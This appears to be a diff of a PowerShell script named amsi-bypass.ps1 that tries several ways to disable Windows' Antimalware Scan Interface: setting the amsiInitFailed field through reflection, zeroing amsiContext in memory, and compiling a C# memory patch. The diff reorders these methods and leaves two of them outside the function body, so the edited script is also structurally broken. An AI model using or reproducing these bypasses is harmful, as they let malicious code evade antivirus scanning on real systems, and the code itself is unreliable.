@@ -1,17 +1,32 @@
 # amsi-bypass.ps1 - Multiple AMSI bypass attempts
 function Bypass-AMSI {
     Write-Host "[+] Attempting AMSI Bypass..." -ForegroundColor Yellow
-    
-    # Method 1: Reflective bypass
+
+
+
+    # Method 1: Alternative reflective
     try {
-        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+        [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').GetValue($null),0x0)
         Write-Host "[+] AMSI Bypass 1: Success" -ForegroundColor Green
         return $true
     } catch {
         Write-Host "[-] AMSI Bypass 1: Failed" -ForegroundColor Red
     }
     
-    # Method 2: Memory patch
+    return $false
+}
+
+
+    # Method 2: Reflective bypass
+    try {
+        [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+        Write-Host "[+] AMSI Bypass 2: Success" -ForegroundColor Green
+        return $true
+    } catch {
+        Write-Host "[-] AMSI Bypass 2: Failed" -ForegroundColor Red
+    }
+    
+    # Method 3: Memory patch
     try {
         $MethodDefinition = @"
 using System;
@@ -35,23 +50,13 @@ public class AMSIPatch {
 "@
         Add-Type $MethodDefinition
         [AMSIPatch]::PatchAMSI()
-        Write-Host "[+] AMSI Bypass 2: Success" -ForegroundColor Green
-        return $true
-    } catch {
-        Write-Host "[-] AMSI Bypass 2: Failed" -ForegroundColor Red
-    }
-    
-    # Method 3: Alternative reflective
-    try {
-        [Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').GetValue($null),0x0)
         Write-Host "[+] AMSI Bypass 3: Success" -ForegroundColor Green
         return $true
     } catch {
         Write-Host "[-] AMSI Bypass 3: Failed" -ForegroundColor Red
     }
     
-    return $false
-}
+    
 
 # Execute the bypass
 if (Bypass-AMSI) {
@@ -59,3 +64,4 @@ if (Bypass-AMSI) {
 } else {
     Write-Host "[-] All AMSI bypass attempts failed" -ForegroundColor Red
 }
+
